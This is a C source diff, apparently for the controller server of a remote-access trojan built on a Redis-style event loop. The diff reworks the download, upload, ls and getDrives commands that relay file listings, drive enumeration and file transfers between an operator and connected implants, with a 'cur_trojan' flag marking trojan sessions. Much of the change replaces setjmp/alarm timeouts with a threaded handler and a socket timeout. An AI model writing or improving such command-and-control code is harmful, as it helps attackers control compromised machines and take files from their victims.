@@ -3,7 +3,6 @@
 #include "myutils.h"
 #include <string.h>
 #include <arpa/inet.h>
-#include <setjmp.h>
 #include <sys/types.h>
 #include <sys/stat.h>
 #include <unistd.h>
@@ -34,8 +33,6 @@ void type##Command(client *c) {\
 	addReply(c, shared.ok);\
 \
 }
-
-extern jmp_buf jmp_env;
 
 client* genericGetClient(client* c){
 	listNode *ln;
@@ -245,11 +242,8 @@ void downloadCommand(client *c){
 	if(fork()==0){
 		int flags = fcntl(tfd, F_GETFL, 0);
 		fcntl(tfd, F_SETFL, 0);
-		if(setjmp(jmp_env))
-			goto err;
 		while(1){
 			memset(&pac, 0, sizeof(pac));
-			alarm(1);
 			count = read(tfd, &pac, sizeof(pac));
 
 			if(count > 0){
@@ -295,7 +289,7 @@ err:			/* error handle*/
 void uploadCommand(client *c){
 	struct stat stbuf;
 	packet pac;
-	int  cfd, leftcount, count, ret;
+	int  cfd, leftcount, count;
 	client *cl = genericGetClient(c);
 
 	if(cl == NULL){
@@ -308,7 +302,7 @@ void uploadCommand(client *c){
 		sprintf(pac.data, "*2\r\n$6\r\nupload\r\n$%d\r\n%s\r\n", (int)strlen(c->argv[1]->ptr),(char*)c->argv[1]->ptr);
 	else
 		sprintf(pac.data, "*2\r\n$6\r\nupload\r\n$%d\r\n%s\r\n", (int)strlen(c->argv[2]->ptr),(char*)c->argv[2]->ptr);
-	ret = write(cl->fd, pac.data, strlen(pac.data));
+	int ret = write(cl->fd, pac.data, strlen(pac.data));
 
 	if(fork() == 0){
 		if(c->cur_trojan){
@@ -325,13 +319,10 @@ void uploadCommand(client *c){
 
 		int flags = fcntl(cl->fd, F_GETFL, 0);
 		fcntl(cl->fd, F_SETFL, 0);
-		if(setjmp(jmp_env))
-			goto err;
 		while(1){
 			memset(&pac, 0, sizeof(pac));
 			if(!c->cur_trojan){
 				while(1){
-					alarm(3);
 					memset(&pac, 0, sizeof(pac));
 					count = read(c->fd, &pac, sizeof(pac));
 					if(count <= 0)
@@ -348,7 +339,6 @@ void uploadCommand(client *c){
 					}
 				}
 			}
-			alarm(3);
 			count = read(cfd, &pac.data, sizeof(pac.data));
 			leftcount -= count;
 			if(count > 0){
@@ -377,67 +367,70 @@ err:			/* error handle */
 	return;
 }
 
-void* thread_func(client* c){
-	printf("pthread before sleep\n");
-	sleep(5);
-	aeCreateFileEvent(server.el, c->fd, AE_READABLE, readQueryFromClient, c);
-	aeCreateFileEvent(server.el, c->fd, AE_WRITABLE, sendReplyToClient, c);
-	//addReplyBulkCString(c, "hello from testCommand Main");
-	printf("pthread after sleep\n");
-	return NULL;
-}
+static void* ls_thread_func(client* c){
+	char buff[1400];
 
-void testCommand(client* c){
-	pthread_t tid;
-
-	aeDeleteFileEvent(server.el, c->fd, AE_WRITABLE | AE_READABLE);
-	printf("main before create thread\n");
-	int ret = pthread_create(&tid, NULL, (void*) thread_func, (void*) c);
-	if(ret){
-		aeCreateFileEvent(server.el, c->fd, AE_READABLE, readQueryFromClient, c);
-		aeCreateFileEvent(server.el, c->fd, AE_WRITABLE, sendReplyToClient, c);
-		addReply(c, shared.err);
-		return;
-	}
-
-	printf("main after create thread\n");
-	addReplyBulkCString(c, "hello from testCommand Main");
-	return;
-}
-
-void lsCommand(client *c){
-	char buff[1024 * 16 * 4];
 	client *cl = genericGetClient(c);
 
 	if(cl == NULL){
 		addReply(c, shared.err);
+		return NULL;
+	}
+	int flags = fcntl(cl->fd, F_GETFL);
+
+	aeDeleteFileEvent(server.el, cl->fd, AE_WRITABLE);
+	aeDeleteFileEvent(server.el, cl->fd, AE_READABLE);
+	aeDeleteFileEvent(server.el, c->fd, AE_WRITABLE);
+	aeDeleteFileEvent(server.el, c->fd, AE_READABLE);
+	memset(buff, 0, sizeof(buff));
+	sprintf(buff, "*1\r\n$2\r\nls\r\n");
+	int ret = write(cl->fd, buff, strlen(buff));
+	if(ret < 0)
+		goto err;
+
+	fcntl(cl->fd, F_SETFL, 0);
+
+	struct timeval tv, tv_bak;
+	tv.tv_sec = 1;
+	tv.tv_usec = 0;
+	setsockopt(cl->fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
+
+	memset(buff, 0, sizeof(buff));
+	int count = read(cl->fd, buff, sizeof(buff));
+
+	if(count > 0){
+		ret = write(c->fd, buff, strlen(buff));
+		if(ret < 0)
+			goto err;
+		while(count % 1400 == 0){
+			memset(buff, 0, sizeof(buff));
+			count = read(cl->fd, buff, sizeof(buff));
+
+			ret = write(c->fd, buff, strlen(buff));
+			if(ret < 0)
+				goto err;
+		}
+	}
+	/* error handle*/
+	else
+err:	addReply(c, shared.err);
+
+	aeCreateFileEvent(server.el, cl->fd, AE_READABLE, readQueryFromClient, cl);
+	aeCreateFileEvent(server.el, cl->fd, AE_WRITABLE, sendReplyToClient, cl);
+	aeCreateFileEvent(server.el, c->fd, AE_READABLE, readQueryFromClient, c);
+	aeCreateFileEvent(server.el, c->fd, AE_WRITABLE, sendReplyToClient, c);
+	fcntl(cl->fd, F_SETFL, flags);
+	return NULL;
+}
+
+void lsCommand(client* c){
+	pthread_t tid;
+
+	int ret = pthread_create(&tid, NULL, ls_thread_func, (void*) c);
+	if(ret){
+		addReply(c, shared.err);
 		return;
 	}
-
-	sprintf(buff, "*1\r\n$2\r\nls\r\n");
-	write(cl->fd, buff, strlen(buff));
-
-	if(fork() == 0){
-		fcntl(cl->fd, F_SETFL, 0);
-		memset(buff, 0, sizeof(buff));
-		if(setjmp(jmp_env))
-			goto err;
-			alarm(1);
-			unsigned int count = read(cl->fd, buff, sizeof(buff));
-			if(count > 0){
-				write(c->fd, buff, strlen(buff));
-				while(count >= sizeof(buff)){
-					alarm(2);
-					count = read(cl->fd, buff, sizeof(buff));
-					write(c->fd, buff, strlen(buff));
-				}
-				exit(0);
-			}
-		/* error handle*/
-err:	write(c->fd, "-ERR\r\n", strlen("-ERR\r\n"));
-		exit(0);
-	}
-
 	return;
 }
 
@@ -456,9 +449,6 @@ void getDrivesCommand(client *c){
 	if(fork() == 0){
 		fcntl(cl->fd, F_SETFL, 0);
 		memset(buff, 0, sizeof(buff));
-		if(setjmp(jmp_env))
-			goto err;
-		alarm(1);
 		unsigned int count = read(cl->fd, buff, sizeof(buff));
 		if(count > 0){
 			write(c->fd, buff, strlen(buff));
